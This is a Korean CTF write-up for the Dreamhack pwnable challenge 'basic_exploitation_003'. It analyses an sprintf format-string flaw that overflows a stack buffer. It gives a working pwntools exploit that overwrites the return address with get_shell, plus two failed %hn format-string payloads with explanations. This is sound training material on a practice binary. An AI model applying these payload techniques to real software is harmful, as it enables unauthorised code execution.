---
title: '[Dreamhack] basic_exploitation_003'
description: Dreamhack [Wargame] - basic_exploitation_003
author: juhyeongkim
date: 2024-10-31 3:43:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/5)

## 바이너리 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main(int argc, char *argv[])
{
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

<br>

## 1. Buffer Overflow

해당 바이너리에는 `sprintf(stack_buf, heap_buf);` 라는 코드가 존재한다. 해당 코드의 기본형은 아래와 같다.

- `int sprintf(char *str, const char* format, ...);`

1. `char *str` : 두 번째 인자인 `format`으로 출력된 문자열을 저장할 문자열을 가리키는 포인터 (`format`에 저장된 문자열 자체가 입력되는게 아니라 `format`이 포맷 스트링으로 쓰이기 때문에, 실제로 포맷 스트링으로 인해 출력되는 문자열이 저장)

2. `const char* format` : 포맷 스트링으로 3번째 이후 인자들의 값을 형식 지정자로 가져와서 출력해준다. (인자가 없으면 레지스터, 스택에서 가져오기 때문에 `FSB` 발생 가능)

예를 들어, `int sprintf(stack_buf, heap_buf);` 에서 `heap_buf`가 `"%10c"` 를 가리킨다면, `stack_buf`에는 10개의 공백 문자(`\x20`)이 입력된다.

**여기서 `Buffer Overflow`가 발생할 수 있는 이유는, `stack_buf`의 크기와 상관없이 포맷 스트링으로 인해 출력되는 문자열을 전부 `stack_buf`에 저장하기 때문이다.**

이번 예제에서 `stack_buf`의 크기는 `0x90`인데, `heap_buf`가 `"%1000c"`를 가리킨다면, `0x90`을 넘어서서 `1000`개의 공백을 `stack_buf`의 주소로부터 계속 입력하게 된다.

**이렇게 되면, `stack_buf`의 범위를 넘어서게 되고, `return_address`까지 덮게 되어 `Return Address Overwrite` 공격을 할 수 있게 된다.**

<br>

## 2. FSB 

`read(0, heap_buf, 0x80);`를 통해 `sprintf(stack_buf, heap_buf);`의 포맷 스트링으로 사용되는 `heap_buf`에 임의의 문자열을 입력할 수 있게 되는 `FSB` 취약점이 존재한다.

그리고, 문제에서 직접적으로 사용되지는 않지만 `printf("ECHO : %s\n", stack_buf);`에는 `FSB` 취약점이 적용되지 않는다.

`stack_buf`를 `%s`로 출력하긴 하지만, 만약 `stack_buf`에 `%1000c`라는 문자열이 저장되어 있었다면, `%s`를 통해 `%1000c`가 입력되면서, 다시 포맷스트링으로 해석되어서 `1000`개의 공백이 출력되는게 아니라 `%1000c`라는 문자열 자체를 출력한다.

<br>

## Exploit

### 1. Return Address Overwrite

앞에서 `BOF` 취약점이 존재하기 때문에 `Return Address Overwrite` 공격을 사용할 수 있다. 문제의 바이너리에는 `get_shell()` 함수가 존재하기 때문에 `main`의 `return_address`를 `get_shell`로 덮어주면 쉘을 획득할 수 있을 것이다.

먼저, `get_shell`의 주소는 아래와 같이 구할 수 있다.

![image](https://github.com/user-attachments/assets/e12794a4-590e-4534-b6ca-47753b234ff5)

이후, `stack_buf`와 `return address` 사이의 오프셋을 계산해서, `heap_buf`를 통해 `stack_buf`에 오프셋 만큼의 공백을 채워준 후, `get_shell`의 주소를 출력해서 `return_address`에 `BOF`를 통해 `get_shell`의 주소가 입력되도록 하면 될 것이다.

먼저, `stack_buf`의 위치를 확인하기 위해 `sprintf`가 수행되는 위치에 `breakpoint`를 설정하고 첫번째 인자인 `stack_buf`의 위치를 파악해보자.

<img width="398" alt="image" src="https://github.com/user-attachments/assets/07cbf46d-dcc2-4b22-8884-067fb48db9aa">

위 스크린샷을 보면, 첫번째 인자인 `s`가 저장된 주소가 `0xffffcf90`임을 알 수 있다. `heap_buf`에 `aaaa`를 입력한 후 `sprintf`를 수행한 후 아래와 같이 `esp`를 검사해보면 `esp + 0x8` 위치에 `stack_buf`가 존재한다는 것까지 알 수 있다.

<img width="513" alt="image" src="https://github.com/user-attachments/assets/08bbfd0b-c987-4e84-935c-88a388484a1a">

gdb를 통해 출력되는 주소에서 맨끝이 낮은 주소임을 잘 생각하자.

그럼 이제, `return_address`의 주소를 찾아서 `stack_buf`와의 오프셋을 구해주면 될 것이다. `bt`를 통해 `main`의 `return_address`를 구해도 되고, `gdb`에는 `BACKTRACE` 부분에 `main`의 `return_address`가 나와있다.

<img width="587" alt="image" src="https://github.com/user-attachments/assets/7c875946-04c0-44ca-833f-25c15c376f28">

<img width="526" alt="image" src="https://github.com/user-attachments/assets/966b5ce5-99e5-4e8c-ac26-777f466696ae">

따라서, `return_address`의 주소는 `0xf7da1519`라는 것을 알 수 있고, 이게 `esp`나 `stack_buf`와 얼마나 떨어진 위치에 저장되어 있는지 확인해보면 된다.

`ret`이 수행되기 직전까지 `ni`를 통해 이동해서 `esp`의 상태를 확인해보면, 바로 `[esp]`에 `0xf7da1519`가 존재하는 것을 확인할 수 있고, 해당 위치는 `0xffffd02c` 이다.

그럼 `stack_buf`와의 오프셋을 계산해보면 아래와 같이 `156` 이라는 것을 알 수 있다.

<img width="530" alt="image" src="https://github.com/user-attachments/assets/721443b0-bbf0-4f0d-b6f7-957bc4d50895">

따라서, 이제 `stack_buf`에 `156`개의 공백을 입력해준 후, `get_shell`의 주소를 덮어주면 `RAO` 공격이 가능할 것이다.

<br>

### 2. Format String Bug

이제, `stack_buf`에 `156`개의 공백과 `get_shell`의 주소를 어떻게 입력할 수 있는지 살펴보자.

`read(0, heap_buf, 0x80);`로 `heap_buf`에 **`%156c` + `p32(get_shell)`**을 입력해주면, `sprintf(stack_buf, heap_buf);`를 통해 `156`개의 공백이 출력되고, `get_shell`의 주소가 입력될 것이다.

<br>

#### 주의할 점

처음에, `FSB`를 할 때, `stack_buf`가 `esp + 0x8`에 위치한다는 것을 통해 `%156c%3$n`를 입력해주어서 `stack_buf`에 156개의 공백을 입력해주려고 했다. (사실 생각해보면 `sprintf`가 `stack_buf`에 바로 입력이 되도록 해주기 때문에 이렇게 할 필요가 없긴 하다.)

근데, 이렇게 하면 안되는 이유가 `%n`은 `[esp + 0x__]`에 저장된 값을 주소로 해석해서, 그 주소가 가리키는 값에 현재까지 출력된 문자열의 길이를 대입해준다.

근데, 처음에 `stack_buf`는 전부 `0`으로 초기화되어 있기 때문에 `[esp + 0x8]`에는 `0`이 저장되어 있을 것이고, 이렇게 되면 `0`을 주소값으로 해석해서 `0x0` 번지에 156개의 공백을 입력해주는 것이므로 `SegFault`가 발생한다.

**항상 `%n`은 `[esp + 0x__]`에 저장된 값을 포인터로 해석해서 해당 주소가 가리키는 위치에 현재까지 출력된 문자열의 길이를 대입해준다는 것을 기억하자.**

<br>

## Exploit Code

```py
from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 12200)
elf = ELF("./basic_exploitation_003")

get_shell = elf.symbols['get_shell']
# get_shell = 0x8048669

# return_address - $rsp = 164
# &stack_buf - $rsp = 8 : [rsp + 0x8]
# return_address - &stack_buf = 156
payload = b"%156c"
# payload = b"%156c%3$n"
payload += p32(get_shell)

p.send(payload)
p.interactive()
```

<br>

### 틀린 풀이 방법 1. 

```py
from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 12200)
elf = ELF("./basic_exploitation_003")

get_shell = elf.symbols['get_shell']
# get_shell = 0x8048669
# 0x0804 = 2052
# 0x8669 = 34409

return_addr = 0xffffd01c

# 이렇게 해버리면 stack_buf에 공백 2045개 + 32357개가 쌓여버림
# 메모리에 저 string이 입력되게 해야함
# 2052 - 7 = 2045
# 34409 - 2052 = 32357
payload = b"%2045c%7$hn"    # 11bytes
payload += b"%3235c%8$hn"  # 12bytes
payload += b"a"             # 여기까지 24bytes
payload += p32(return_addr + 2)
payload += p32(return_addr)

p.send(payload)
p.interactive()
```

처음에 `sprintf`가 포맷스트링으로 출력된 문자열이 아니라 포맷스트링 자체를 저장하는줄 알고, `heap_buf`에 포맷스트링을 입력해서 `stack_buf`에 입력해준 후, `printf("ECHO : %s\n", stack_buf);`를 통해 FSB 공격을 하려고 헀다. (사실 위에서 설명했듯이 `printf`에서는 FSB 공격도 안먹히긴 한다.)

따라서, `return_address`가 저장된 `esp`의 위치를 구해서 `[esp + 0x__]`에 대입 후, 그 주소에 너비 지정자를 통해 `get_shell`만큼의 주소를 대입하려고 했다.

근데 이렇게 되버리면, `sprintf`의 특성 때문에 `stack_buf`에 `"%2045c"`라는 문자열이 입력되는게 아니라 `stack_buf`에 차례대로 `2045`개의 공백과 `32357`개의 공백이 입력되버려서 `stack_buf`에 포맷스트링 자체가 아닌 포맷스트링으로 출력된 문자열이 들어가게 되버린다.

그래서 `%%2045c`로 `stack_buf`에 `%2045c`를 입력해주더라도, 뒤에서 `printf("ECHO : %s\n", stack_buf);`를 통해 포맷스트링 공격이 불가능해서 RAO가 통하지 않으므로 논리 자체가 틀린다.

**`printf("ECHO : %s\n", stack_buf);` 여기서는 `stack_buf`가 `%s`로 바뀌는 과정에서 포맷 스트링으로 해석되는게 아니라 문자열 그 자체로 해석되서 여기서도 `2045`개의 공백이 아닌 `%2045c` 자체가 출력되기 때문이다.**

<img width="745" alt="image" src="https://github.com/user-attachments/assets/4e453001-22cd-4cd5-b197-86273f6d896c">

<br>

### 틀린 풀이 방법 2.

```py
from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 12415)
elf = ELF("./basic_exploitation_003")

get_shell = elf.symbols['get_shell']
# get_shell = 0x8048669
# 0x0804 = 2052
# 0x8669 = 34409

printf_got = elf.got['printf']
# printf_got = 0x804a010

# 34409 - 2052 = 32357
payload = b"%2052c%7$hn"    # 11bytes
payload += b"%32357c%8$hn"  # 12bytes
payload += b"a"             # 여기까지 24bytes
payload += p64(printf_got + 2)
payload += p64(printf_got)

p.send(payload)
p.interactive()
```

위에서 얘기한 방법에서 `return_address`가 저장된 스택의 주소에 쓰는게 아니라 `printf@got`를 `get_shell`으로 조작하려고 했는데, 처음에 `sprintf()`의 특성을 제대로 이해하지 못해서 생각한 방법이고, 실제로는 불가능한 논리이다.

1. 일단 틀린 풀이 방법 1.처럼 `stack_buf`에 `payload` 문자열 자체를 저장해줘야 하는데, 포맷 스트링 문자열 자체가 아닌 포맷 스트링으로 출력되는 문자열이 `stack_buf`에 대입되므로 불가능하고,

2. 위 논리대로 `stack_buf`에 포맷 스트링 문자열 자체를 대입해주더라도, `printf("ECHO : %s\n", stack_buf);`에서 실제 `FSB` 공격을 통해 `printf@got`에 `get_shell`의 주소를 대입해야 하는데, `printf`를 수행하고 난 다음에 `printf@got`에 `get_shell`의 주소를 넣어주면 막상 `printf`를 호출했을 때는 `get_shell`이 실행되지 않기 때문에 아예 틀린 순서이긴 하다.

3. 그리고 사실 2.에서도 논리 오류가 있는게 앞에서 설명했듯이 `printf("ECHO : %s\n", stack_buf);`에서 실제 `FSB` 공격이 안되기도 한다.